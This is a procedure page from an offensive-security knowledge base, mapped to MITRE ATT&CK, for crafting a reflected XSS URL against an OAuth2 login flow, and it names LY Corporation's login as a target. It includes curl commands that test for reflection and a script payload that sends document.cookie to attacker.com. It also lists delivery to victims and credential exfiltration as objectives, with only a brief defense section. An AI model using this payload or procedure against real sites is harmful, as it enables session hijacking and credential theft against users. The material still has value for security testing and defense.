---
tags:
  - xss
  - reflected-xss
  - oauth2
type: procedure
tools:
  - '[[tools/Web-Browser]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-test-xss-url]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques:
  - '[[JavaScript]]'
id: 08aa2bed-fe22-4fb1-8a97-abfc82050882
created_at: '2025-12-11T06:10:22.369Z'
updated_at: '2025-12-11T06:10:22.369Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0001]]'
mitre_techniques:
  - '[[T1190]]'
---
# Craft Malicious XSS URL

## Summary

This procedure involves crafting a malicious URL that exploits a reflected XSS vulnerability in an OAUTH2 login flow by injecting JavaScript payloads into unsanitized parameters, enabling code execution in the victim's browser for credential theft.

## Description

The vulnerability stems from insufficient input sanitization in the OAUTH2 login parameters, allowing reflected inputs to be rendered as HTML/JavaScript. This procedure targets web applications like LY Corporation's login flow, where parameters such as 'state' or 'redirect_uri' may reflect user input without proper encoding. The expected outcome is a URL that, when visited, executes arbitrary JS to steal cookies or credentials.

## Requirements

1. Access to the target OAUTH2 endpoint URL.
2. Knowledge of vulnerable parameters (e.g., via testing or source review).
3. A web browser or tool for testing payload execution.

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and output encoding (e.g., using Content Security Policy).
- Monitor for suspicious URL patterns in logs, such as script tags in query parameters.

## Objectives

1. Create a URL that injects and executes JavaScript.
2. Prepare for delivery to victims.
3. Achieve credential exfiltration.

## Instructions

### Step 1: Identify Vulnerable Parameter

**Context**: Test the OAUTH2 login URL for parameters that reflect input without sanitization.

**Command** ([[commands/curl-test-xss-url]]):

```bash
curl "https://example.com/oauth2/login?state=test<input>" | grep "test<input>"
```

> This checks if the input is reflected raw in the response.

### Step 2: Inject XSS Payload

**Context**: Append a JavaScript payload to the vulnerable parameter.

**Command** ([[commands/curl-test-xss-url]]):

```bash
curl "https://example.com/oauth2/login?state=<script>document.location='https://attacker.com/steal?data='+document.cookie</script>"
```

> This crafts the full malicious URL; test in a browser to confirm execution.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques

- [[JavaScript]]

## Commands Used

- [[commands/curl-test-xss-url]]

## Tools Used

- [[tools/Web-Browser]]

## Tags

- [[commands/curl-test-xss-url]]
- [[oauth2]]
